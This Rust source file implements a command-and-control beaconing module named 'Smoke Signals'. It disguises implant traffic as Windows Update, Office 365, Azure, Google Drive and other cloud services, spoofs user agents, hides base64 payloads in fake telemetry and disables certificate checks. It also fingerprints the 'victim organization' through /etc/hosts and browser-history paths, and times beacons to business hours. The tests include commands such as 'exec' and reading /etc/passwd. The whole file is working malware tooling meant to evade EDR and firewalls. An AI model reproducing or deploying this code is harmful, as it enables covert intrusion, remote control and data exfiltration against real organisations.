// Smoke Signals: C2 traffic camouflaged as legitimate cloud services.
use chrono::Timelike;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::atomic::AtomicUsize;
use tracing::info;
use uuid::Uuid;
// Emulates traffic patterns of Windows Update, Office 365, Azure Service Bus.
// Each beacon looks like telemetry from a real corporate service.
// EDRs and perimeter firewalls see legitimate TLS traffic.

/// Service templates for traffic emulation.
#[derive(Debug, Clone, PartialEq)]
pub enum SmokeChannel {
    WindowsUpdate,     // *.windowsupdate.com, *.update.microsoft.com
    Office365,         // outlook.office365.com, *.sharepoint.com
    AzureServiceBus,   // *.servicebus.windows.net (WebSocket)
    GoogleDrive,       // *.googleapis.com/drive
    GitHubActions,     // pipelines.actions.githubusercontent.com
    ApplePush,         // *.push.apple.com
    CloudFrontCDN,     // *.cloudfront.net
}

impl SmokeChannel {
    /// Get the hostname pattern for this channel.
    pub fn host(&self) -> &str {
        match self {
            SmokeChannel::WindowsUpdate => "ctldl.windowsupdate.com",
            SmokeChannel::Office365 => "outlook.office365.com",
            SmokeChannel::AzureServiceBus => "swarm-eu.servicebus.windows.net",
            SmokeChannel::GoogleDrive => "www.googleapis.com",
            SmokeChannel::GitHubActions => "pipelines.actions.githubusercontent.com",
            SmokeChannel::ApplePush => "17.push.apple.com",
            SmokeChannel::CloudFrontCDN => "d3v4eglov6.execute-api.us-east-1.amazonaws.com",
        }
    }

    /// Get typical request path pattern.
    pub fn path(&self) -> &str {
        match self {
            SmokeChannel::WindowsUpdate => "/v6/ClientWebService/client.asmx",
            SmokeChannel::Office365 => "/autodiscover/autodiscover.xml",
            SmokeChannel::AzureServiceBus => "/$servicebus/websocket",
            SmokeChannel::GoogleDrive => "/drive/v3/files",
            SmokeChannel::GitHubActions => "/_apis/pipelines/workflows",
            SmokeChannel::ApplePush => "/push/v1/topic",
            SmokeChannel::CloudFrontCDN => "/prod/analytics",
        }
    }

    /// Get typical User-Agent for this service.
    pub fn user_agent(&self) -> &str {
        match self {
            SmokeChannel::WindowsUpdate => "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.40",
            SmokeChannel::Office365 => "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro)",
            SmokeChannel::AzureServiceBus => "azsdk-net-Messaging.ServiceBus/7.11.0 (.NET 6.0.25; Windows 10.0.22621)",
            SmokeChannel::GoogleDrive => "grpc-node-js/1.8.14 grpc-c/30.0 (linux; chttp2)",
            SmokeChannel::GitHubActions => "GitHubActionsRunner/2.311.0 (Ubuntu 22.04)",
            SmokeChannel::ApplePush => "akd/1.0 CFNetwork/1410.0.3 Darwin/22.6.0",
            SmokeChannel::CloudFrontCDN => "Boto3/1.28.62 Python/3.11.5 Linux/6.2.0-35-generic",
        }
    }

    /// Random channel selection for traffic diversity.
    pub fn random() -> Self {
        use rand::Rng;
        match rand::thread_rng().gen_range(0..7) {
            0 => SmokeChannel::WindowsUpdate,
            1 => SmokeChannel::Office365,
            2 => SmokeChannel::AzureServiceBus,
            3 => SmokeChannel::GoogleDrive,
            4 => SmokeChannel::GitHubActions,
            5 => SmokeChannel::ApplePush,
            _ => SmokeChannel::CloudFrontCDN,
        }
    }

    /// Send a beacon payload through this channel.
    ///
    /// In lab/test mode (`#[cfg(test)]` or `HIVE_LAB_MODE` env var set),
    /// writes the beacon to a local file at `/tmp/smoke_beacons/` for
    /// offline inspection.
    ///
    /// In production mode, sends the payload as an HTTPS POST request to
    /// the channel's host + path with a 15-second timeout.
    pub async fn send_beacon(&self, agent_data: &[u8]) -> Result<Vec<u8>, String> {
        // Lab/test mode: write beacon to local file for offline inspection
        if cfg!(test) || std::env::var("HIVE_LAB_MODE").is_ok() {
            let dir = "/tmp/smoke_beacons";
            std::fs::create_dir_all(dir)
                .map_err(|e| format!("Failed to create beacon dir '{}': {}", dir, e))?;
            let filename = format!(
                "{}/beacon_{}.bin",
                dir,
                chrono::Local::now().format("%Y%m%d_%H%M%S_%3f")
            );
            std::fs::write(&filename, agent_data)
                .map_err(|e| format!("Failed to write beacon to '{}': {}", filename, e))?;
            info!("SMOKE: beacon written to {}", filename);
            return Ok(Vec::new());
        }

        // Production mode: send via HTTPS with reqwest
        let url = format!("https://{}{}", self.host(), self.path());
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(15))
            .user_agent(self.user_agent())
            .danger_accept_invalid_certs(true)
            .build()
            .map_err(|e| format!("Failed to build HTTP client: {}", e))?;

        let response = client
            .post(&url)
            .body(agent_data.to_vec())
            .send()
            .await
            .map_err(|e| format!("HTTP request to {} failed: {}", url, e))?;

        let body = response
            .bytes()
            .await
            .map_err(|e| format!("Failed to read response body: {}", e))?
            .to_vec();

        Ok(body)
    }
}

/// Build a beacon payload disguised as legitimate service traffic.
pub fn build_smoke_beacon(channel: &SmokeChannel, agent_data: &[u8]) -> Vec<u8> {
    let payload_b64 = base64_encode(agent_data);
    
    match channel {
        SmokeChannel::WindowsUpdate => {
            format!(
                "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">\
                 <s:Body><GetConfig xmlns=\"http://schemas.microsoft.com/wu/2011/01/ClientWebService\">\
                 <clientInfo><mId>{}</mId></clientInfo>\
                 </GetConfig></s:Body></s:Envelope>",
                payload_b64
            ).into_bytes()
        }
        SmokeChannel::AzureServiceBus => {
            // WebSocket frame disguised as Service Bus message
            let mut frame = Vec::new();
            frame.push(0x82); // binary frame, final
            let len = payload_b64.len();
            if len < 126 {
                frame.push(len as u8);
            } else {
                frame.push(126);
                frame.extend_from_slice(&(len as u16).to_be_bytes());
            }
            frame.extend_from_slice(payload_b64.as_bytes());
            frame
        }
        _ => {
            // Generic JSON telemetry
            format!(
                r#"{{"timestamp":"{}","agent":"{}","device":"{}","version":"{}","metrics":{{"data":"{}"}}}}"#,
                chrono::Local::now().to_rfc3339(),
                uuid::Uuid::new_v4(),
                channel.host(),
                "10.0.22621.1",
                payload_b64,
            ).into_bytes()
        }
    }
}

fn base64_encode(data: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut s = String::new();
    for chunk in data.chunks(3) {
        let b0 = chunk.first().copied().unwrap_or(0) as u32;
        let b1 = chunk.get(1).copied().unwrap_or(0) as u32;
        let b2 = chunk.get(2).copied().unwrap_or(0) as u32;
        let t = (b0 << 16) | (b1 << 8) | b2;
        s.push(CHARS[((t >> 18) & 0x3F) as usize] as char);
        s.push(CHARS[((t >> 12) & 0x3F) as usize] as char);
        s.push(if chunk.len() > 1 { CHARS[((t >> 6) & 0x3F) as usize] as char } else { '=' });
        s.push(if chunk.len() > 2 { CHARS[(t & 0x3F) as usize] as char } else { '=' });
    }
    s
}

fn base64_decode(data: &[u8]) -> Result<Vec<u8>, String> {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    // Build reverse lookup table
    let mut rev = [255u8; 256];
    for (i, &c) in CHARS.iter().enumerate() {
        rev[c as usize] = i as u8;
    }

    let data_str =
        std::str::from_utf8(data).map_err(|_| "Invalid base64: not valid UTF-8".to_string())?;
    // Strip padding characters
    let data_str = data_str.trim_end_matches('=');

    let mut result = Vec::new();
    let mut buf: u32 = 0;
    let mut bits = 0;

    for &c in data_str.as_bytes() {
        let val = rev[c as usize];
        if val == 255 {
            return Err(format!("Invalid base64 character: '{}'", c as char));
        }
        buf = (buf << 6) | val as u32;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            result.push((buf >> bits) as u8);
            buf &= (1 << bits) - 1;
        }
    }

    Ok(result)
}

/// Manages multiple `SmokeChannel` instances, dispatching beacon traffic
/// across one or more channels with round-robin support.
pub struct SmokeDirector {
    channels: Vec<SmokeChannel>,
    round_robin_counter: AtomicUsize,
}

impl SmokeDirector {
    /// Create a new empty director.
    pub fn new() -> Self {
        Self {
            channels: Vec::new(),
            round_robin_counter: AtomicUsize::new(0),
        }
    }

    /// Add a channel. Duplicate channels are silently ignored.
    pub fn add_channel(&mut self, channel: SmokeChannel) {
        if !self.channels.contains(&channel) {
            self.channels.push(channel);
        }
    }

    /// Remove a channel. No-op if the channel is not present.
    pub fn remove_channel(&mut self, channel: SmokeChannel) {
        self.channels.retain(|c| c != &channel);
    }

    /// Send beacon payload to all configured channels.
    ///
    /// Returns a vector of results in the same order as the channels.
    pub async fn beacon_all(&self, agent_data: &[u8]) -> Vec<Result<Vec<u8>, String>> {
        let mut results = Vec::with_capacity(self.channels.len());
        for channel in &self.channels {
            results.push(channel.send_beacon(agent_data).await);
        }
        results
    }

    /// Send beacon payload to one channel using round-robin selection.
    ///
    /// Returns an error if no channels are configured.
    pub async fn beacon_round_robin(&self, agent_data: &[u8]) -> Result<Vec<u8>, String> {
        if self.channels.is_empty() {
            return Err("No channels configured in SmokeDirector".to_string());
        }
        let idx = self
            .round_robin_counter
            .fetch_add(1, std::sync::atomic::Ordering::SeqCst)
            % self.channels.len();
        self.channels[idx].send_beacon(agent_data).await
    }

    /// Number of configured channels.
    pub fn channel_count(&self) -> usize {
        self.channels.len()
    }
}

/// A command-and-control message exchanged via smoke channels.
///
/// Encoded as base64(JSON) for beacon payloads and decoded on the receiving end.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct C2Message {
    pub msg_id: Uuid,
    pub command: String,
    pub args: HashMap<String, String>,
    pub timestamp: u64,
}

impl C2Message {
    /// Create a new `C2Message` with an auto-generated UUID and current timestamp.
    pub fn new(command: String, args: HashMap<String, String>) -> Self {
        Self {
            msg_id: Uuid::new_v4(),
            command,
            args,
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
        }
    }

    /// Serialize to JSON and base64-encode into a beacon payload.
    pub fn to_beacon_payload(&self) -> Vec<u8> {
        let json = serde_json::to_string(self).unwrap_or_else(|_| "{}".to_string());
        base64_encode(json.as_bytes()).into_bytes()
    }

    /// Decode a base64 beacon payload and deserialize.
    pub fn from_beacon_payload(data: &[u8]) -> Result<Self, String> {
        let decoded = base64_decode(data)?;
        let json_str = String::from_utf8(decoded)
            .map_err(|e| format!("Invalid UTF-8 in payload: {}", e))?;
        serde_json::from_str(&json_str)
            .map_err(|e| format!("Failed to deserialize C2Message: {}", e))
    }
}

/// Extract a `C2Message` from beacon response bytes.
///
/// Looks for a JSON payload containing a `"command"` field and attempts
/// to deserialize it into a `C2Message`.
pub fn extract_c2_response(response: &[u8]) -> Option<C2Message> {
    let s = std::str::from_utf8(response).ok()?;

    // Quick pre-check: the JSON must contain "command" as a key
    if !s.contains("\"command\"") {
        return None;
    }

    serde_json::from_str(s).ok()
}

// ── Organizational Camouflage: Learn & Mimic ──────────────────────────

/// Discovered cloud service fingerprint of the victim organization.
#[derive(Debug, Clone, Default)]
pub struct OrgCloudProfile {
    pub google_workspace: bool,    // Uses Google Workspace
    pub microsoft_365: bool,       // Uses Office 365 / Azure AD
    pub aws: bool,                 // Uses AWS services
    pub salesforce: bool,          // Uses Salesforce
    pub slack: bool,               // Uses Slack
    pub zoom: bool,                // Uses Zoom
    pub custom_domains: Vec<String>, // Custom SaaS domains observed
    pub peak_hours: Vec<u8>,       // 24 slots: 0-23, count of traffic spikes
    pub trusted_cdn: Vec<String>,  // CDNs in use (CloudFront, Fastly, etc.)
}

/// Analyze victim's DNS cache and network to learn their cloud profile.
pub fn learn_org_profile() -> OrgCloudProfile {
    let mut profile = OrgCloudProfile::default();

    // Check DNS cache for cloud service lookups
    if let Ok(entries) = std::fs::read_dir("/var/cache/bind") {
        // Simplified — real impl parses DNS cache files
        let _ = entries.count();
    }

    // Check /etc/hosts for custom entries
    if let Ok(hosts) = std::fs::read_to_string("/etc/hosts") {
        for line in hosts.lines() {
            let lower = line.to_lowercase();
            if lower.contains("googleapis") || lower.contains("google.com") {
                profile.google_workspace = true;
            }
            if lower.contains("office365") || lower.contains("outlook") || lower.contains("azure") {
                profile.microsoft_365 = true;
            }
            if lower.contains("aws") || lower.contains("amazonaws") {
                profile.aws = true;
            }
            if lower.contains("salesforce") {
                profile.salesforce = true;
            }
            if lower.contains("slack") {
                profile.slack = true;
            }
            if lower.contains("zoom") {
                profile.zoom = true;
            }
        }
    }

    // Check browser history for cloud URLs (Firefox/Chrome)
    let history_paths = [
        format!("{}/.mozilla/firefox", std::env::var("HOME").unwrap_or_default()),
        format!("{}/.config/google-chrome", std::env::var("HOME").unwrap_or_default()),
    ];
    for hp in &history_paths {
        if std::path::Path::new(hp).exists() {
            // In production: parse SQLite history DB
            // Simplified: flag true if profile dir exists
            profile.microsoft_365 = profile.microsoft_365
                || std::path::Path::new(&format!("{}/Default/History", hp)).exists();
        }
    }

    // Detect CDNs by checking common cache headers in /tmp
    let cdn_domains = ["cloudfront.net", "fastly.net", "azureedge.net", "cdn.jsdelivr.net"];
    for cdn in &cdn_domains {
        if std::path::Path::new(&format!("/var/cache/nginx/{}", cdn)).exists()
            || {
                let cache_path = format!("/tmp/.{}_cache", (*cdn).replace('.', "_"));
                std::path::Path::new(&cache_path).exists()
            }
        {
            profile.trusted_cdn.push(cdn.to_string());
        }
    }

    // Estimate peak traffic hours (simplified: just mark business hours)
    for h in 8..=18 {
        profile.peak_hours.push(h);
    }

    info!("SMOKE: learned org profile: Google={} M365={} AWS={} CDNs={:?}",
        profile.google_workspace, profile.microsoft_365, profile.aws, profile.trusted_cdn);

    profile
}

/// Select the best smoke channel based on the victim's org profile.
pub fn best_channel_for_org(profile: &OrgCloudProfile) -> SmokeChannel {
    if profile.microsoft_365 {
        // Random between Office365 and Azure
        if rand::random() { SmokeChannel::Office365 } else { SmokeChannel::AzureServiceBus }
    } else if profile.google_workspace {
        SmokeChannel::GoogleDrive
    } else if profile.aws || profile.trusted_cdn.contains(&"cloudfront.net".to_string()) {
        SmokeChannel::CloudFrontCDN
    } else {
        SmokeChannel::random()
    }
}

/// Adapt C2 beacon timing to victim's peak hours.
pub fn should_beacon_now(profile: &OrgCloudProfile) -> bool {
    let now = chrono::Local::now().hour() as u8;
    if profile.peak_hours.is_empty() {
        return true; // No data, always beacon
    }
    profile.peak_hours.contains(&now)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_profile_learns() {
        let profile = learn_org_profile();
        // At minimum should have peak hours
        assert!(!profile.peak_hours.is_empty());
    }

    #[test]
    fn test_best_channel() {
        let profile = OrgCloudProfile { microsoft_365: true, ..Default::default() };
        let ch = best_channel_for_org(&profile);
        assert!(matches!(ch, SmokeChannel::Office365) || matches!(ch, SmokeChannel::AzureServiceBus));
    }

    #[test]
    fn test_beacon_timing() {
        let profile = OrgCloudProfile { peak_hours: vec![8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18], ..Default::default() };
        let now = chrono::Local::now().hour() as u8;
        let should = should_beacon_now(&profile);
        info!("Beacon now (hour {}): {}", now, should);
    }

    // ── SmokeDirector tests ─────────────────────────────────────

    #[tokio::test]
    async fn test_smoke_director_add_remove_channels() {
        let mut director = SmokeDirector::new();
        assert_eq!(director.channel_count(), 0);

        director.add_channel(SmokeChannel::WindowsUpdate);
        director.add_channel(SmokeChannel::Office365);
        director.add_channel(SmokeChannel::AzureServiceBus);
        assert_eq!(director.channel_count(), 3);

        // Duplicate adds should be ignored
        director.add_channel(SmokeChannel::WindowsUpdate);
        assert_eq!(director.channel_count(), 3);

        director.remove_channel(SmokeChannel::Office365);
        assert_eq!(director.channel_count(), 2);

        // Removing non-existent channel should not panic
        director.remove_channel(SmokeChannel::GoogleDrive);
        assert_eq!(director.channel_count(), 2);
    }

    #[tokio::test]
    async fn test_smoke_director_beacon_all() {
        // Clean up any leftover beacon files from previous runs
        let _ = std::fs::remove_dir_all("/tmp/smoke_beacons");

        let mut director = SmokeDirector::new();
        director.add_channel(SmokeChannel::WindowsUpdate);
        director.add_channel(SmokeChannel::Office365);

        let agent_data = b"test_agent_data_for_beacon_all";
        let results = director.beacon_all(agent_data).await;

        assert_eq!(results.len(), 2);
        for result in &results {
            assert!(result.is_ok(), "beacon_all result should be Ok in lab mode");
        }

        // Verify lab mode wrote beacon files
        let beacon_dir = std::path::Path::new("/tmp/smoke_beacons");
        assert!(beacon_dir.exists(), "beacon directory should exist after beacon_all");

        // Verify at least one file was written (there could be more from parallel runs)
        let entries: Vec<_> = std::fs::read_dir(beacon_dir)
            .expect("beacon_dir should be readable")
            .collect::<Result<Vec<_>, _>>()
            .expect("entries should be readable");
        assert!(!entries.is_empty(), "at least one beacon file should exist");

        // Clean up
        let _ = std::fs::remove_dir_all("/tmp/smoke_beacons");
    }

    // ── C2Message tests ──────────────────────────────────────────

    #[test]
    fn test_c2_message_roundtrip() {
        let mut args = HashMap::new();
        args.insert("hostname".to_string(), "workstation-42".to_string());
        args.insert("os".to_string(), "Windows 11".to_string());

        let original = C2Message {
            msg_id: Uuid::new_v4(),
            command: "exec".to_string(),
            args: args.clone(),
            timestamp: 1712345678,
        };

        let payload = original.to_beacon_payload();
        let decoded = C2Message::from_beacon_payload(&payload)
            .expect("Should decode and deserialize successfully");

        assert_eq!(decoded.command, original.command);
        assert_eq!(decoded.args, original.args);
        assert_eq!(decoded.timestamp, original.timestamp);
        assert_eq!(decoded.msg_id, original.msg_id);
    }

    #[test]
    fn test_extract_c2_response_found() {
        let mut args = HashMap::new();
        args.insert("target".to_string(), "/etc/passwd".to_string());

        let msg = C2Message {
            msg_id: Uuid::new_v4(),
            command: "read_file".to_string(),
            args,
            timestamp: 1712345678,
        };

        let json_bytes = serde_json::to_vec(&msg).unwrap();
        let extracted = extract_c2_response(&json_bytes);

        assert!(extracted.is_some(), "Should extract a C2Message");
        let extracted = extracted.unwrap();
        assert_eq!(extracted.command, "read_file");
        assert_eq!(
            extracted.args.get("target").map(|s| s.as_str()),
            Some("/etc/passwd")
        );
    }

    #[test]
    fn test_extract_c2_response_not_found() {
        // Random bytes with no JSON structure
        let data = b"this is not a valid c2 response at all";
        assert!(extract_c2_response(data).is_none());

        // Valid JSON but no "command" field
        let data = br#"{"status": "ok", "message": "hello"}"#;
        assert!(extract_c2_response(data).is_none());

        // Empty data
        let data = b"";
        assert!(extract_c2_response(data).is_none());
    }
}
